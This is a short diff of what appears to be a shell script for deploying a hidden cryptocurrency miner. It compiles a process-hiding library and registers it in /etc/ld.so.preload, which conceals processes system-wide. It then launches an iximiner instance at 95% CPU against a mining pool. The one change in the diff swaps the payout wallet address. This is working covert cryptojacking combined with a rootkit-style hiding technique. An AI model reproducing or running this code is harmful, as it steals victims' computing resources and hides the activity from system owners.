@@ -55,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./iximiner --mode miner --pool https://ixi.hash.express --wallet 3hy3CxLLChETAcx8Z6vSLH4q5QKPfitADPnksvmMTMV8DXmPK1sPD33KfWWuXmFAR --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 95 --gpu-intensity 0
+./graftcp/graftcp & clear & ./iximiner --mode miner --pool https://ixi.hash.express --wallet 5EYh6f2nawaGiJrna19sU7LMBv2Z7AHQqsDfUTgdJf2163seFXwdoEBfqJrnJ55Pp --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 95 --gpu-intensity 0
